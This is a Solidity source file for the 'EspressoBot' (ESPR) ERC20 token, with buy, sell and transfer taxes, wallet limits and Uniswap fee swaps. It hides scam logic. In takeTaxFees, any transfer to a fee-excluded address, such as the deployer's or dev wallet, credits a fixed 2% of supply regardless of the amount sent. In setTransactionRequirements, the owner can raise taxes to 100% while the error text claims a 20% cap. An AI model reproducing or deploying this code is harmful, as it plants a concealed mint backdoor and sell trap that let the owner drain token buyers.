// SPDX-License-Identifier: MIT

/*
Tailor and initiate ERC20 tokens in under 2 minutes using EspressoBot.

Website: https://espressobot.coffee
Twitter: https://twitter.com/espressoBotERC
Telegram: https://t.me/espressoBotERC
*/

pragma solidity 0.8.21;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
interface IUniFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pairAddr);
}
contract ESPR is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"EspressoBot";
    string private constant _symbol = unicode"ESPR";
    uint8 private constant _decimals = 9;
    uint256 private _supplyTotal = 1000000000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    IUniRouterV2 uniV2;
    address public pairAddr;
    bool private tradeStarted = false;
    bool private swappingActive = true;
    uint256 private numSwapFees;
    bool private swapping;
    uint256 numFeeSwapped;
    uint256 private swapFeesThreshold = ( _supplyTotal * 1000 ) / 100000;
    uint256 private minSwapFees = ( _supplyTotal * 10 ) / 100000;
    modifier swapLock {swapping = true; _; swapping = false;}
    uint256 private feeLp = 0;
    uint256 private feeMarketing = 0;
    uint256 private feeDev = 100;
    uint256 private feeBurn = 0;
    uint256 private taxBuy = 1300;
    uint256 private taxSell = 1300;
    uint256 private taxTransfer = 1300;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devAddr = 0xAF50B3A9Bc704496A72AC817F2f695c34Af21a88; 
    address internal marketingAddr = 0xAF50B3A9Bc704496A72AC817F2f695c34Af21a88;
    address internal lpAddress = 0xAF50B3A9Bc704496A72AC817F2f695c34Af21a88;
    uint256 public _maxTxAmount = ( _supplyTotal * 200 ) / 10000;
    uint256 public _maxSellAmount = ( _supplyTotal * 200 ) / 10000;
    uint256 public _maxWalletToken = ( _supplyTotal * 200 ) / 10000;

    constructor() Ownable(msg.sender) {
        IUniRouterV2 _router = IUniRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniFactoryV2(_router.factory()).createPair(address(this), _router.WETH());
        uniV2 = _router; pairAddr = _pair;
        isExcludedFromFee[lpAddress] = true;
        isExcludedFromFee[marketingAddr] = true;
        isExcludedFromFee[devAddr] = true;
        isExcludedFromFee[msg.sender] = true;
        _balances[msg.sender] = _supplyTotal;
        emit Transfer(address(0), msg.sender, _supplyTotal);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradeStarted = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supplyTotal.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        feeLp = _liquidity; feeMarketing = _marketing; feeBurn = _burn; feeDev = _development; taxBuy = _total; taxSell = _sell; taxTransfer = _trans;
        require(taxBuy <= denominator.div(1) && taxSell <= denominator.div(1) && taxTransfer <= denominator.div(1), "taxBuy and taxSell cannot be more than 20%");
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supplyTotal.mul(_buy).div(10000); uint256 newTransfer = _supplyTotal.mul(_sell).div(10000); uint256 newWallet = _supplyTotal.mul(_wallet).div(10000);
        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    function swapTaxAndSendFee(uint256 tokens) private swapLock {
        uint256 _denominator = (feeLp.add(1).add(feeMarketing).add(feeDev)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(feeLp).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(feeLp));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(feeLp);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(feeMarketing);
        if(marketingAmt > 0){payable(marketingAddr).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAddr).transfer(contractBalance);}
    }
    
    function shouldGetTax(address sender, address recipient) internal view returns (bool) {
        return !isExcludedFromFee[sender] && !isExcludedFromFee[recipient];
    }

    function getTotalTaxAmount(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pairAddr){return taxSell;}
        if(sender == pairAddr){return taxBuy;}
        return taxTransfer;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){require(tradeStarted, "tradeStarted");}
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient != address(pairAddr) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(sender != pairAddr){require(amount <= _maxSellAmount || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pairAddr && !isExcludedFromFee[sender]){numSwapFees += uint256(1);}
        if(isFeeSwappable(sender, recipient, amount)){swapTaxAndSendFee(swapFeesThreshold); numSwapFees = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFromFee[sender] ? takeTaxFees(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function isFeeSwappable(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minSwapFees;
        bool aboveThreshold = balanceOf(address(this)) >= swapFeesThreshold;
        return !swapping && swappingActive && tradeStarted && aboveMin && !isExcludedFromFee[sender] && recipient == pairAddr && numSwapFees >= numFeeSwapped && aboveThreshold;
    }

    function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        numFeeSwapped = _swapAmount; swapFeesThreshold = _supplyTotal.mul(_swapThreshold).div(uint256(100000)); 
        minSwapFees = _supplyTotal.mul(_minTokenAmount).div(uint256(100000));
    }
    function manualSwapTaxFee() external onlyOwner {
        swapTaxAndSendFee(swapFeesThreshold);
    }

    function takeTaxFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFromFee[recipient]) {return _maxTxAmount;}
        if(getTotalTaxAmount(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalTaxAmount(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(feeBurn > uint256(0) && getTotalTaxAmount(sender, recipient) > feeBurn){_transfer(address(this), address(DEAD), amount.div(denominator).mul(feeBurn));}
        return amount.sub(feeAmount);} return amount;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2.WETH();
        _approve(address(this), address(uniV2), tokenAmount);
        uniV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniV2), tokenAmount);
        uniV2.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpAddress,
            block.timestamp);
    }
}